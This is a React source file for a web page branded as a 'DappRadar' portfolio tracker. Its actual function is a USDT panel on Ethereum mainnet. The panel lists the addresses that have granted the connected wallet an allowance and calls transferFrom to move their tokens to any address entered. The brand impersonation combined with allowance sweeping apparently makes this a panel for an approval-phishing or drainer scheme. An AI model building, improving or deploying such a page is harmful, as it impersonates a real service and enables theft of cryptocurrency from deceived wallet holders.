'use client'

import { useState, useEffect, useCallback } from "react"
import { ethers } from "ethers"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { AlertCircle, InfoIcon, Bell } from "lucide-react"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"

// USDT Contract Address on Ethereum Mainnet
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"

// USDT ABI for calling the transferFrom function, checking balances, and allowances
const USDT_ABI = [
  "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
  "function balanceOf(address account) public view returns (uint256)",
  "function allowance(address owner, address spender) public view returns (uint256)",
  "event Approval(address indexed owner, address indexed spender, uint256 value)"
]

export default function Component() {
  const [account, setAccount] = useState<string | null>(null)
  const [isTransferring, setIsTransferring] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [balance, setBalance] = useState<string | null>(null)
  const [fromAddress, setFromAddress] = useState("")
  const [toAddress, setToAddress] = useState("")
  const [amount, setAmount] = useState("")
  const [allowance, setAllowance] = useState<string | null>(null)
  const [approvedAddresses, setApprovedAddresses] = useState<string[]>([])

  const connectWallet = useCallback(async () => {
    if (typeof window.ethereum !== 'undefined') {
      try {
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })
        setAccount(accounts[0])
        checkNetwork()
      } catch (error) {
        console.error("Error connecting to wallet:", error)
        setError("Failed to connect wallet. Please try again.")
      }
    } else {
      setError("No Ethereum wallet detected. Please install MetaMask or a compatible wallet.")
    }
  }, [])

  const checkNetwork = async () => {
    if (typeof window.ethereum !== 'undefined') {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' })
      if (chainId !== '0x1') { // Ethereum Mainnet
        setError("Please switch to Ethereum Mainnet")
      } else {
        setError(null)
      }
    }
  }

  useEffect(() => {
    if (account) {
      checkBalance()
      getApprovedAddresses()
    }
  }, [account])

  const checkBalance = async () => {
    if (typeof window.ethereum === 'undefined' || !account) return

    const provider = new ethers.BrowserProvider(window.ethereum)
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider)

    try {
      const balance = await usdtContract.balanceOf(account)
      setBalance(ethers.formatUnits(balance, 6))
    } catch (error) {
      console.error("Error checking balance:", error)
    }
  }

  const checkAllowance = async () => {
    if (typeof window.ethereum === 'undefined' || !account || !fromAddress) return

    const provider = new ethers.BrowserProvider(window.ethereum)
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider)

    try {
      const allowance = await usdtContract.allowance(fromAddress, account)
      setAllowance(ethers.formatUnits(allowance, 6))
    } catch (error) {
      console.error("Error checking allowance:", error)
    }
  }

  const getApprovedAddresses = async () => {
    if (typeof window.ethereum === 'undefined' || !account) return

    const provider = new ethers.BrowserProvider(window.ethereum)
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider)

    try {
      const filter = usdtContract.filters.Approval(null, account)
      const events = await usdtContract.queryFilter(filter, -10000) // Last 10000 blocks

      const uniqueAddresses = [...new Set(events.map(event => event?.args?.[0]).filter(Boolean))]
      setApprovedAddresses(uniqueAddresses)
    } catch (error) {
      console.error("Error getting approved addresses:", error)
    }
  }

  const handleTransferFrom = async () => {
    if (typeof window.ethereum === 'undefined') {
      setError("Please connect to an Ethereum wallet!")
      return
    }

    if (!fromAddress || !toAddress || !amount || parseFloat(amount) <= 0) {
      setError("Please fill in all fields with valid values")
      return
    }

    setIsTransferring(true)
    setError(null)

    try {
      const provider = new ethers.BrowserProvider(window.ethereum)
      const signer = await provider.getSigner()
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer)

      const parsedAmount = ethers.parseUnits(amount, 6)

      const tx = await usdtContract.transferFrom(fromAddress, toAddress, parsedAmount)
      console.log("Transaction Hash:", tx.hash)
      alert(`TransferFrom transaction sent! Hash: ${tx.hash}`)
      
      // Wait for transaction to be mined
      await tx.wait()
      alert("TransferFrom transaction confirmed!")
      
      // Update balance after successful transfer
      checkBalance()
      checkAllowance()
      getApprovedAddresses()
    } catch (error) {
      console.error("Error during transferFrom:", error)
      if (error.code === 4001) {
        setError("Transaction rejected by user")
      } else if (error.message.includes("insufficient allowance")) {
        setError("Insufficient allowance. Make sure the 'from' address has approved enough USDT for you to spend.")
      } else {
        setError(error.message || "Error during transferFrom. Check console for details.")
      }
    } finally {
      setIsTransferring(false)
    }
  }

  return (
    <div className="min-h-screen bg-[#0a0b1e] text-white">
      <header className="flex justify-between items-center p-4">
        <div className="flex items-center">
          <img src="/placeholder.svg?height=32&width=32" alt="DappRadar Logo" className="mr-2" />
          <span className="text-xl font-bold">DappRadar</span>
        </div>
        <div className="flex items-center">
          <Button variant="ghost" className="mr-2">
            <Bell className="h-5 w-5" />
          </Button>
          <Button variant="secondary" onClick={connectWallet}>
            {account ? `${account.slice(0, 6)}...${account.slice(-4)}` : "Connect"}
          </Button>
        </div>
      </header>
      <main className="container mx-auto px-4 py-8">
        <h1 className="text-5xl font-bold text-center mb-4">Portfolio Tracker</h1>
        <p className="text-center text-xl mb-8">Sync your assets, recent dapp usage, view your NFTs and more.</p>
        <Card className="bg-[#1c1d31] border-none mb-6">
          <CardContent className="p-4">
            <Input
              placeholder="Paste Wallet address or ENS"
              className="bg-[#2c2d45] border-none text-white"
            />
          </CardContent>
        </Card>
        {!account && (
          <Button className="w-full mb-6 bg-blue-600 hover:bg-blue-700" onClick={connectWallet}>
            Open Wallet
          </Button>
        )}
        {account && (
          <Card className="bg-[#1c1d31] border-none">
            <CardContent className="p-6">
              <h2 className="text-2xl font-bold mb-4">USDT TransferFrom</h2>
              {balance && (
                <p className="text-sm mb-4">
                  <strong>Your USDT Balance:</strong> {parseFloat(balance).toFixed(2)} USDT
                </p>
              )}
              <div className="space-y-4">
                <div>
                  <Label htmlFor="fromAddress">From Address</Label>
                  <Input
                    id="fromAddress"
                    value={fromAddress}
                    onChange={(e) => setFromAddress(e.target.value)}
                    className="bg-[#2c2d45] border-none text-white"
                  />
                </div>
                <div>
                  <Label htmlFor="toAddress">To Address</Label>
                  <Input
                    id="toAddress"
                    value={toAddress}
                    onChange={(e) => setToAddress(e.target.value)}
                    className="bg-[#2c2d45] border-none text-white"
                  />
                </div>
                <div>
                  <Label htmlFor="amount">Amount (USDT)</Label>
                  <Input
                    id="amount"
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="bg-[#2c2d45] border-none text-white"
                  />
                </div>
              </div>
              <Button onClick={checkAllowance} className="w-full mt-4 bg-blue-600 hover:bg-blue-700">
                Check Allowance
              </Button>
              {allowance !== null && (
                <p className="text-sm mt-2">
                  <strong>Current Allowance:</strong> {parseFloat(allowance).toFixed(2)} USDT
                </p>
              )}
              <Alert variant="warning" className="mt-4 bg-yellow-900 border-yellow-600">
                <InfoIcon className="h-4 w-4" />
                <AlertTitle>Important</AlertTitle>
                <AlertDescription>
                  Ensure that the 'from' address has approved you to spend their USDT. The allowance must be greater than or equal to the transfer amount.
                </AlertDescription>
              </Alert>
              <Button onClick={handleTransferFrom} disabled={isTransferring} className="w-full mt-4 bg-blue-600 hover:bg-blue-700">
                {isTransferring ? "Transferring..." : "Transfer USDT"}
              </Button>
              {error && (
                <Alert variant="destructive" className="mt-4 bg-red-900 border-red-600">
                  <AlertCircle className="h-4 w-4" />
                  <AlertTitle>Error</AlertTitle>
                  <AlertDescription>{error}</AlertDescription>
                </Alert>
              )}
              <div className="mt-6">
                <h3 className="text-xl font-bold mb-2">Approved Addresses</h3>
                {approvedAddresses.length > 0 ? (
                  <ul className="list-disc pl-5">
                    {approvedAddresses.map((address, index) => (
                      <li key={index} className="text-sm mb-1">
                        {address}
                      </li>
                    ))}
                  </ul>
                ) : (
                  <p className="text-sm">No approved addresses found.</p>
                )}
              </div>
            </CardContent>
          </Card>
        )}
      </main>
    </div>
  )
}